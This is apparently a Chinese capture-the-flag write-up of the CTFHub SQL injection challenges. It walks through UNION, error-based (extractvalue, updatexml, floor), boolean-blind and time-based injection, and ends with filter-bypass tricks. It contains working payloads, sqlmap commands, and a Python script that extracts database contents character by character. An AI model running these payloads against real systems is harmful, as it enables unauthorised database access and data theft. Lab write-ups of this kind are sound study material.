+++
date = '2025-07-28T16:48:12+08:00'
draft = false
title = 'CTFHub之SQL注入'
categories = ['WriteUP']
tags = ['WriteUP', 'CTFHub']

+++

> 在开始前，我们需要理解一个 SQL 注入中最常用的词汇 —— **构造闭合** 。

<!--more-->

## 1、整数型注入

- 可以使用 sqlmap 工具直接处理。
```bash
# 查询所有数据库
sqlmap -u http://xxx/?id=1 --dbs 
# 查看各个数据库的所有表
sqlmap -u http://xxx/?id=1 -D '数据库名' --tables
# 查看指定数据库的指定表的字段
sqlmap -u http://xxx/?id=1 -D '数据库名' -T '表名' --dump
```

以下是常规方法。
- 随便输入一个 `1`，得到返回，测试可知存在两个注入点。
- 使用 `order by` 确定列数，方便后续注入。
- 爆破当前数据库。
```SQL
/?id=-1 union select 6,database()
```
- 爆破所有库
```SQL
/?id=-1 union select 1,group_concat(schema_name) from information_schema.schemata
```
- 爆破该数据库中的所有表。
```SQL
-- 要将数据库名sqli转换成十六进制的格式
/?id=-1 union select 6,group_concat(table_name) from information_schema.tables where table_schema=0x73716C69
```
- 爆破 flag 表中的字段，同理。
```SQL
/?id=-1 union select 6,group_concat(column_name) from information_schema.columns where table_name=0x666C6167
```
- 查询 sqli 库中 flag 表中字段 flag 的值。
```SQL
/?id=-1 union select 6,flag from sqli.flag
```
- 然后就得到 Flag 了！

## 2、字符型注入

- 当然，这题也可以直接交给 sqlmap 去注入。
- 正常做法和整数型注入差不多，只不过这里是 `id='1'`，为了不受最后的单引号影响，于是我们要将它注释掉。
- 还是先爆破当前数据库。
```SQL
/?id=-1' union select 6,database()--+
```
- 再爆破表。
```SQL
/?id=-1' union select 6,group_concat(table_name) from information_schema.tables where table_schema=0x73716C69--+
```
- 再爆破字段。
```SQL
/?id=-1' union select 6,group_concat(column_name) from information_schema.columns where table_name=0x666C6167--+
```
- 最后爆破字段值。
```SQL
/?id=-1' union select 6,flag from sqli.flag--+
```
- 成功获得 Flag！

## 3、报错注入

### 利用extractvalue来xpath报错
```Shell
1 and (select extractvalue(1, concat(0x7e, (select database()))))
1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= 'sqli'))))
1 and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name= 'flag'))))
1 and (select extractvalue(1, concat(0x7e, (select flag from flag))))
```
### 利用updatexml来xpath报错
```Shell
1 and (select updatexml(1, (concat (0x7e, (select database()))),1))
1 and (select updatexml(1, (concat (0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='sqli'))),1)) 
1 and (select updatexml(1, (concat (0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag'))),1)) 
1 and (select updatexml(1, concat(0x7e, (select flag from flag)), 1))
```
### 利用floor来group by主键重复报错
```Shell
1 union select count(*), concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1), floor(rand(0)*2)) x from news group by x
1 union select count(*), concat((select column_name from information_schema.columns where table_name='flag' limit 0,1), floor(rand(0)*2)) x from news group by x
1 union select count(*), concat((select flag from flag limit 0,1), floor(rand(0)*2)) x from news group by x
```

## 4、布尔盲注
- 使用 `length()` 获取长度信息。
```SQL
SELECT username,password FROM users WHERE id = 1 AND length(username)=1;
```
- `SUBSTR()` 函数用于截取字符串中的一部分。利用 `SUBSTR()` 函数，逐步截取数据库中的某个数据。
```SQL
SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,1,1) = '?';
```
- 来自 CSDN 的 Python 脚本。
```Python
import requests
 
urlOPEN = 'http://xxx.sandbox.ctfhub.com:10800' #换成自己环境的url
starOperatorTime = []
mark = 'query_success'
 
def database_name():
    name = ''
    for j in range(1,9):
        for i in 'sqcwertyuioplkjhgfdazxvbnm':
            url = urlOPEN+'/?id=if(substr(database(),%d,1)="%s",1,(select table_name from information_schema.tables))' %(j,i)
            # print(url+'%23')
            r = requests.get(url)
            if mark in r.text:
                name = name+i
                print(name)
                break
    print('database_name:',name)
 
 
def table_name():
    list = []
    for k in range(0,4):
        name=''
        for j in range(1,9):
            for i in 'sqcwertyuioplkjhgfdazxvbnm':
                url = urlOPEN+'/?id=if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)="%s",1,(select table_name from information_schema.tables))' %(k,j,i)
                # print(url+'%23')
                r = requests.get(url)
                if mark in r.text:
                    name = name+i
                    break
        list.append(name)
    print('table_name:',list)
 
 
def column_name():
    list = []
    for k in range(0,3): #判断表里最多有4个字段
        name=''
        for j in range(1,9): #判断一个 字段名最多有9个字符组成
            for i in 'sqcwertyuioplkjhgfdazxvbnm':
                url=urlOPEN+'/?id=if(substr((select column_name from information_schema.columns where table_name="flag"and table_schema= database() limit %d,1),%d,1)="%s",1,(select table_name from information_schema.tables))' %(k,j,i)
                r=requests.get(url)
                if mark in r.text:
                    name=name+i
                    break
        list.append(name)
    print ('column_name:',list)
 
 
def get_data():
    name=''
    for j in range(1,50): #判断一个值最多有51个字符组成
        for i in range(48,126):
            url=urlOPEN+'/?id=if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))' %(j,i)
            r=requests.get(url)
            if mark in r.text:
                name=name+chr(i)
                print(name)
                break
    print ('value:',name)
 
 
if __name__ == '__main__':
    database_name()
    table_name()
    column_name()
    get_data()
```

## 5、时间盲注
- `sleep()` 函数是时间盲注的核心。
```SQL
SELECT * FROM users WHERE username='admin' AND IF(SLEEP(5),1,0)
```
- 利用延时函数，如 `SLEEP()` 函数或者 `BENCHMARK()` 函数，来判断是否注入成功。
```SQL
SELECT username,password FROM users WHERE id = 1 AND IF(ASCII(SUBSTR(username,1,1))=97,SLEEP(5),0)
```
- 利用数据库中的时间戳函数，如 `UNIX_TIMESTAMP()` 函数来构造延时语句。
```SQL
SELECT username,password FROM users WHERE id = 1 AND IF(UNIX_TIMESTAMP()>1620264296,SLEEP(5),0)
```
## 空格绕过
- 将空格替换成 `/**/` 即可，利用 SQL 的注释功能来进行绕过。

## 等号绕过
- 将等号替换成 `like` 即可。